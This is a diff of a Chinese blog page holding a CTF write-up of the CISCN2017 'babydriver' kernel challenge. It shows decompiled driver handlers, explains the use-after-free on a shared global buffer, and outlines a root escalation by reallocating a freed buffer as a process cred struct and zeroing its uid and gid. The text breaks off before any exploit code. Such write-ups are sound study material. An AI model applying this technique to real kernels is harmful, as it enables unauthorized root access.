@@ -1,488 +1,292 @@
 <!DOCTYPE html>
+<html lang="zh-Hans">
 
 
 
 
 
-
-
-
-
-
-
-
-  
-
-
-<html class="theme-next pisces use-motion" lang="zh-Hans">
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
-<meta name="theme-color" content="#222">
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
-
-<link rel="stylesheet" href="/css/main.css?v=7.1.0">
-
-
-  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.1.0">
-
-
-  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.1.0">
-
-
-  <link rel="mask-icon" href="/images/logo.svg?v=7.1.0" color="#222">
-
-
-
-
-
-
-
-<script id="hexo.configurations">
-  var NexT = window.NexT || {};
-  var CONFIG = {
-    root: '/',
-    scheme: 'Pisces',
-    version: '7.1.0',
-    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
-    back2top: true,
-    back2top_sidebar: false,
-    fancybox: false,
-    fastclick: false,
-    lazyload: false,
-    tabs: true,
-    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
-    algolia: {
-      applicationID: '',
-      apiKey: '',
-      indexName: '',
-      hits: {"per_page":10},
-      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
-    }
-  };
-</script>
-
-
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
   
+  <meta name="description" content="zs0zrc&#39;s blog">
+  <meta name="author" content="zs0zrc">
+  <meta name="keywords" content="pwn CTF security anythings">
+  <title>【kernel-UAF】babydriver - zs0zrc</title>
+
+  <link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
 
 
+  <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+
+<link rel="stylesheet" href="/css/main.css">
 
 
-  <meta name="description" content="题目来源：CISCN2017 babydriver 拿到手后是一个压缩包，解压后有三个文件 123boot.sh		#启动脚本bzImage		#内核binaryrootfs.cpio	#文件系统映像 boot.sh  ​    可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码 将rootfs.cpio解压，查看里面的文件  ​    可以发现flag的owner被设为">
-<meta name="keywords" content="pwn,kernel">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【kernel-UAF】babydriver">
-<meta property="og:url" content="http://yoursite.com/2019/02/15/2019-2-15-kernel-UAF/index.html">
-<meta property="og:site_name" content="zs0zrc">
-<meta property="og:description" content="题目来源：CISCN2017 babydriver 拿到手后是一个压缩包，解压后有三个文件 123boot.sh		#启动脚本bzImage		#内核binaryrootfs.cpio	#文件系统映像 boot.sh  ​    可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码 将rootfs.cpio解压，查看里面的文件  ​    可以发现flag的owner被设为">
-<meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/picture/1550198147800.png">
-<meta property="og:image" content="http://yoursite.com/picture/1550198467931.png">
-<meta property="og:image" content="http://yoursite.com/picture/1550221693129.png">
-<meta property="og:updated_time" content="2019-02-15T09:08:54.719Z">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="【kernel-UAF】babydriver">
-<meta name="twitter:description" content="题目来源：CISCN2017 babydriver 拿到手后是一个压缩包，解压后有三个文件 123boot.sh		#启动脚本bzImage		#内核binaryrootfs.cpio	#文件系统映像 boot.sh  ​    可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码 将rootfs.cpio解压，查看里面的文件  ​    可以发现flag的owner被设为">
-<meta name="twitter:image" content="http://yoursite.com/picture/1550198147800.png">
+  <link rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css">
 
 
+<!-- 自定义样式保持在最底部 -->
 
-
-
-  
-  
-  <link rel="canonical" href="http://yoursite.com/2019/02/15/2019-2-15-kernel-UAF/">
-
-
-
-<script id="page.configurations">
-  CONFIG.page = {
-    sidebar: "",
-  };
-</script>
-
-  <title>【kernel-UAF】babydriver | zs0zrc</title>
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  <noscript>
-  <style>
-  .use-motion .motion-element,
-  .use-motion .brand,
-  .use-motion .menu-item,
-  .sidebar-inner,
-  .use-motion .post-block,
-  .use-motion .pagination,
-  .use-motion .comments,
-  .use-motion .post-header,
-  .use-motion .post-body,
-  .use-motion .collection-title { opacity: initial; }
-
-  .use-motion .logo,
-  .use-motion .site-title,
-  .use-motion .site-subtitle {
-    opacity: initial;
-    top: initial;
-  }
-
-  .use-motion .logo-line-before i { left: initial; }
-  .use-motion .logo-line-after i { right: initial; }
-  </style>
-</noscript>
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
-  
-  
-    
-  
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>zs0zrc</strong>&nbsp;</a>
 
-  <div class="container sidebar-position-left page-post-detail">
-    <div class="headband"></div>
-
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
-      <div class="header-inner"><div class="site-brand-wrapper">
-  <div class="site-meta">
-    
-
-    <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
-        <span class="logo-line-before"><i></i></span>
-        <span class="site-title">zs0zrc</span>
-        <span class="logo-line-after"><i></i></span>
-      </a>
-    </div>
-    
-    
-  </div>
-
-  <div class="site-nav-toggle">
-    <button aria-label="切换导航栏">
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
-      <span class="btn-bar"></span>
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
     </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
   </div>
-</div>
-
-
-
-<nav class="site-nav">
-  
-    <ul id="menu" class="menu">
-      
-        
-        
-        
-          
-          <li class="menu-item menu-item-home">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-about">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>关于</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-tags">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-categories">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
-
-  </li>
-        
-        
-        
-          
-          <li class="menu-item menu-item-archives">
-
-    
-    
-    
-      
-    
-
-    
-
-    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
-
-  </li>
-
-      
-      
-    </ul>
-  
-
-  
-
-  
 </nav>
 
-
-
-  
-
-
-
-</div>
-    </header>
-
-    
-  
-  
-
-  
-
-  <a href="https://github.com/zszcr" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewbox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"/><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"/><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"/></svg></a>
-
-
-
-    <main id="main" class="main">
-      <div class="main-inner">
-        <div class="content-wrap">
-          
-            
-
-          
-          <div id="content" class="content">
-            
-
-  <div id="posts" class="posts-expand">
-    
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/02/15/2019-2-15-kernel-UAF/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="zs0zrc">
-      <meta itemprop="description" content="zs0zrc's blog">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="zs0zrc">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">【kernel-UAF】babydriver
-
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2019-02-15 09:10:05 / 修改时间：17:08:54" itemprop="dateCreated datePublished" datetime="2019-02-15T09:10:05+08:00">2019-02-15</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/Linux-Kernel/" itemprop="url" rel="index"><span itemprop="name">Linux_Kernel</span></a></span>
-
-                
-                
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
               
             </span>
-          
 
-          
             
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  Friday, February 15th 2019, 9:10 am
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    1.2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      5 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
             
-          
+          </div>
 
           
-          
-
-          
-
-          
-
-          
-
         </div>
-      </header>
-    
+      </div>
+    </div>
+  </header>
 
+  <main>
     
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
       
 
-      
-        <p>题目来源：<a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/babydriver.tar" target="_blank" rel="noopener">CISCN2017 babydriver</a></p>
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <p>题目来源：<a href="https://github.com/bash-c/pwn_repo/blob/master/CISCN2017_babydriver/babydriver.tar" target="_blank" rel="noopener">CISCN2017 babydriver</a></p>
 <p>拿到手后是一个压缩包，解压后有三个文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">boot.sh		#启动脚本</span><br><span class="line">bzImage		#内核binary</span><br><span class="line">rootfs.cpio	#文件系统映像</span><br></pre></td></tr></table></figure>
-<p>boot.sh</p>
-<p><img src="/picture/1550198147800.png" alt="1550198147800"></p>
+<pre><code>boot.sh        #启动脚本
+bzImage        #内核binary
+rootfs.cpio    #文件系统映像
+</code></pre><p>boot.sh</p>
+<p><img src="/picture/1550198147800.png" srcset="/img/loading.gif" alt="1550198147800"></p>
 <p>​    可以发现开启了smep防护，而smep保护主要功能是禁止内核执行用户态的代码</p>
 <p>将rootfs.cpio解压，查看里面的文件</p>
-<p><img src="/picture/1550198467931.png" alt="1550198467931"></p>
+<p><img src="/picture/1550198467931.png" srcset="/img/loading.gif" alt="1550198467931"></p>
 <p>​    可以发现flag的owner被设为root，以及它加载了babydriver.ko这个内核模块。很明显，漏洞应该就在这个模块中</p>
 <p>防护机制：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">☁  4.4.72  checksec babydriver.ko </span><br><span class="line">[*] &apos;/home/zs0zrc/pwn/kernel/babydriver/file/lib/modules/4.4.72/babydriver.ko&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>
-<p>将内核模块取出，用ida分析</p>
+<pre><code>☁  4.4.72  checksec babydriver.ko 
+[*] &#39;/home/zs0zrc/pwn/kernel/babydriver/file/lib/modules/4.4.72/babydriver.ko&#39;
+    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x0)
+</code></pre><p>将内核模块取出，用ida分析</p>
 <p>分析下主要的函数</p>
 <p><strong>babyrelease</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyrelease</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  kfree(babydev_struct.device_buf);	<span class="comment">//释放堆空间</span></span><br><span class="line">  printk(<span class="string">"device release\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int __fastcall babyrelease(inode *inode, file *filp)
+{
+  _fentry__(inode, filp);
+  kfree(babydev_struct.device_buf);    //释放堆空间
+  printk(&quot;device release\n&quot;);
+  return 0;
+}
+</code></pre>
 <p>这里涉及到了一个结构体</p>
 <p><strong>babydevice_t</strong></p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="keyword">babydevice_t</span>    struc ; (<span class="keyword">sizeof</span>=<span class="number">0x10</span>, align=<span class="number">0x8</span>, copyof_429)</span><br><span class="line"><span class="number">00000000</span>                                         ; XREF: .bss:babydev_struct/r</span><br><span class="line"><span class="number">00000000</span> device_buf      dq ?                    ; XREF: babyrelease+<span class="number">6</span>/r</span><br><span class="line"><span class="number">00000000</span>                                         ; babyopen+<span class="number">26</span>/w ... ; offset</span><br><span class="line"><span class="number">00000008</span> device_buf_len  dq ?                    ; XREF: babyopen+<span class="number">2</span>D/w</span><br><span class="line"><span class="number">00000008</span>                                         ; babyioctl+<span class="number">3</span>C/w ...</span><br><span class="line"><span class="number">00000010</span> <span class="keyword">babydevice_t</span>    ends</span><br></pre></td></tr></table></figure>
+<pre><code class="c">00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
+00000000                                         ; XREF: .bss:babydev_struct/r
+00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
+00000000                                         ; babyopen+26/w ... ; offset
+00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
+00000008                                         ; babyioctl+3C/w ...
+00000010 babydevice_t    ends
+</code></pre>
 <p><strong>babyopen</strong></p>
 <p>申请一块大小为0x40的空间，地址赋给babydev_struct.device_buf，同时将babydev_struct.device_buf_len设为0x40</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">babyopen</span><span class="params">(inode *inode, file *filp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, filp);</span><br><span class="line">  babydev_struct.device_buf = (<span class="keyword">char</span> *)kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">37748928L</span>L, <span class="number">64L</span>L);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64L</span>L;</span><br><span class="line">  printk(<span class="string">"device open\n"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">int __fastcall babyopen(inode *inode, file *filp)
+{
+  _fentry__(inode, filp);
+  babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);
+  babydev_struct.device_buf_len = 64LL;
+  printk(&quot;device open\n&quot;);
+  return 0;
+}
+</code></pre>
 <p><strong>babyioctl</strong></p>
 <p>这个函数实现了一个设备控制命令0x10001，功能是将全局变量 babydev_struct中的babydev_struct.device_buf释放掉，然后再根据用户传入的size重新申请一块空间，并且将babydev_struct.device_buf_len设置为对应的值</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// local variable allocation has failed, the output may be wrong!</span></span><br><span class="line">__int64 __<span class="function">fastcall <span class="title">babyioctl</span><span class="params">(file *filp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rbx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, *(_QWORD *)&amp;command);</span><br><span class="line">  v4 = v3;</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = (<span class="keyword">char</span> *)_kmalloc(v4, <span class="number">37748928L</span>L);</span><br><span class="line">    babydev_struct.device_buf_len = v4;</span><br><span class="line">    printk(<span class="string">"alloc done\n"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2EB);</span><br><span class="line">    result = <span class="number">-22L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">// local variable allocation has failed, the output may be wrong!
+__int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
+{
+  size_t v3; // rdx
+  size_t v4; // rbx
+  __int64 result; // rax
+
+  _fentry__(filp, *(_QWORD *)&amp;command);
+  v4 = v3;
+  if ( command == 0x10001 )
+  {
+    kfree(babydev_struct.device_buf);
+    babydev_struct.device_buf = (char *)_kmalloc(v4, 37748928LL);
+    babydev_struct.device_buf_len = v4;
+    printk(&quot;alloc done\n&quot;);
+    result = 0LL;
+  }
+  else
+  {
+    printk(&amp;unk_2EB);
+    result = -22LL;
+  }
+  return result;
+}
+</code></pre>
 <p><strong>babywirte</strong></p>
 <p>这里我用ida反编译的代码看的有点奇怪，所以我看了下汇编的代码，这里copy_from_user()中的参数应该是</p>
 <p>copy_from_user(babydev_struct.device_buf,buffer,length)，就是从用户空间buffer中拷贝数据到babydev_struct.device_buf</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babywrite</span><span class="params">(file *filp, <span class="keyword">const</span> <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &lt;= v4 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  v6 = v4;</span><br><span class="line">  copy_from_user();</span><br><span class="line">  result = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
+{
+  size_t v4; // rdx
+  ssize_t result; // rax
+  ssize_t v6; // rbx
+
+  _fentry__(filp, buffer);
+  if ( !babydev_struct.device_buf )
+    return -1LL;
+  result = -2LL;
+  if ( babydev_struct.device_buf_len &lt;= v4 )
+    return result;
+  v6 = v4;
+  copy_from_user();
+  result = v6;
+  return result;
+}
+</code></pre>
 <p><strong>babyread</strong></p>
 <p>这个和babywrite差不多，将babydev_struct.device_buf 的内容拷贝到buffer中</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">ssize_t</span> __<span class="function">fastcall <span class="title">babyread</span><span class="params">(file *filp, <span class="keyword">char</span> *buffer, <span class="keyword">size_t</span> length, <span class="keyword">loff_t</span> *offset)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">ssize_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v6; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(filp, buffer, length, offset);</span><br><span class="line">  <span class="keyword">if</span> ( !babydev_struct.device_buf )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1L</span>L;</span><br><span class="line">  result = <span class="number">-2L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( babydev_struct.device_buf_len &lt;= v4 )</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  v6 = v4;</span><br><span class="line">  copy_to_user(buffer);</span><br><span class="line">  result = v6;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="c">ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
+{
+  size_t v4; // rdx
+  ssize_t result; // rax
+  ssize_t v6; // rbx
+
+  _fentry__(filp, buffer, length, offset);
+  if ( !babydev_struct.device_buf )
+    return -1LL;
+  result = -2LL;
+  if ( babydev_struct.device_buf_len &lt;= v4 )
+    return result;
+  v6 = v4;
+  copy_to_user(buffer);
+  result = v6;
+  return result;
+}
+</code></pre>
 <p><strong>漏洞点</strong></p>
 <p>这里存在一个伪条件竞争的UAF漏洞，如果同时打开两个设备，那么后面分配的设备会覆盖掉之前的设备，因为babydev_struct是全局变量。同理，如果释放掉第一个设备，那么第二个设备也是被释放过的。</p>
 <p><strong>利用思路</strong></p>
@@ -493,535 +297,368 @@
 <li>通过另一个文件描述符写，将cred中的uid和gid改为0</li>
 </ol>
 <p>对应版本的cred结构体，大小为0xa8</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span 